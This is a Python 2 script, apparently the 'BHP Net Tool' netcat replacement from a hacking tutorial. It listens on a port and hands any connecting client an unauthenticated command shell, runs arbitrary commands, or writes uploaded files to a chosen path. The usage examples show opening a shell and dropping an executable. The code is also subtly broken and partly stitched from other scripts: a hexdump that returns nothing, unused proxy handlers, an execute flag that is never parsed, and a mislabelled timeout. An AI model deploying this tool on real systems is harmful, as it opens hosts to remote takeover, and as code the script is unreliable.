import sys
import socket
import threading
import getopt
import subprocess
#---------------------------------------
# Global variables
#---------------------------------------
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

#---------------------------------------
def useage():
#---------------------------------------

    print "BHP Net Tool:"
    print
    print "Useage: bhpnet.py -t target_host -p port"
    print "-l --listen  -listen on [host]:[pport] for incoming connection" 
    print "-e --execute=file_to_run - execute the given file upon receiving a connection"
    print "-c--command - initialize a command shell"
    print "-u --upload=destination - upon receiving connection upload a file and write to [destination]"
    print
    print
    print "examples: "
    print "bhpnet.py -t 192.168.0.1. -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1. -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1. -p 5555 -l -e=\"cat /etc/hosts\""
    print "echo `/etc/hosts` | ./bhpnet.py -t 192.168.0.1 -p 135"
    sys.exit()
#--------------------------------------       
def server_loop():
#--------------------------------------
    global target
    
    # if not target is specified, listen/bind to all interfaces
    if not len(target):
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    
    while True:
        client_socket,addr = server.accept()
        
        #spin off new thread to handle new client
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()
     

#--------------------------------------    
def client_sender(buffer):
#--------------------------------------    
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        #connect to target host
        client.connect((target,port))
        if len(buffer):
            client.send(buffer)
        while True:
            # wait for data block
            recv_len = 1
            response = ""
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                if recv_len < 4096:
                    break
            print response,
            
            #wait for more input
            buffer = raw_input("")
            buffer += "\n"
            
            #send it off
            client.send(buffer)
    except:
        print "[*] Exception! Exiting,"
        client.close()
        

#--------------------------------------
def run_command(command):
#--------------------------------------
    # trim the newline
    command = command.rstrip()
    
    # run the command and get the output back
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output = "failed to execute command.\r\n"
    # send the output back to the client
    return output

#--------------------------------------
def client_handler(client_socket):
#--------------------------------------
    global upload
    global execute
    global command
    
    # check for upload
    if len(upload_destination):
        # read in all of the bytes and write to our destination
        file_buffer = ""
        # keep reading data until none is available
        while True:
            data = client_socket.recv(4096)
            if not data:
                break
            else:
                file_buffer += data
        # now we take these bytes and try to write them out
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            # acknowledge that we wrote the file out
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
    
    # check for execute                           
    if len(execute):
        # run the command
        output = run_command(execute)
        client_socket.send(output)
        
    # now we go into another loop if a command shell was requested
    if command:
        while True:
            # show a simple prompt
            client_socket.send("<BHP:#> ")
            
            # now we receive until we see a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            
            # send back the command output
            response = run_command(cmd_buffer)
            
            # send back the response
            client_socket.send(response)
#-------------------------------------             
def hexdump(src,length=8):
#-------------------------------------  
    result = []
    digits = 4 if isinstance(src, unicode) else 2
    for i in xrange(0, len(src), length):
        s = src[i:i+length]
        hexa = b' '.join(["%0*X" % (digits, ord(x))  for x in s])
        text = b''.join([x if 0x20 <= ord(x) < 0x7F else b'.'  for x in s])
        result.append( b"%04X   %-*s   %s" % (i, length*(digits + 1), hexa, text) )
        
#-------------------------------------         
def receive_from(connection):
#------------------------------------- 
    buffer = ""
    # we set a 2 minute timeout, this may have to be adjusted
    connection.settimeout(2)
    
    try:
        # keep reading into the buffer until there's no more data
        # or timeout
        while True:
            data = connection.recv(4096)
            if not data:
                break
            buffer += data
    except:
        pass
    return buffer

#-------------------------------------  
def request_handler(buffer):
#------------------------------------- 
    # modify any requests from destined for the remote host
    # perform packet modifications
    return buffer
#-------------------------------------  
def response_handler(buffer):
#-------------------------------------     
    # modify any requests from destined for the local host
    # perform packet modifications
    return buffer
#-------------------------------------    
def main():
#-------------------------------------
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        useage()
    # read the command line args
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",
        ["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print str(err)
        useage()
    for o,a in opts:
        if o in ("-h","--help"):
            useage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-l","--listen"):
            listen = True  
        elif o in ("-c","--commandshell"):
            command = True
        elif o in ("-u","--upload"):
            upload_destination = a
        elif o in ("-t","--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "unhandled Option"
    # are we goingto listen or just send data from <stdin> ?
    if not listen and len(target) and port > 0:
        # read in the buffer from commandLine
        # this will block, so send CTRL-D if not sending input to <stdin>
        buffer = sys.stdin.read()
        # send data off
        client_sender(buffer)
        
    # we are going to listen and potentially upload things, execute commands, 
    # and drop a shell depending on our command line options above
    
    if listen:
        server_loop()
#--------------------------------------
# call main
#--------------------------------------
main()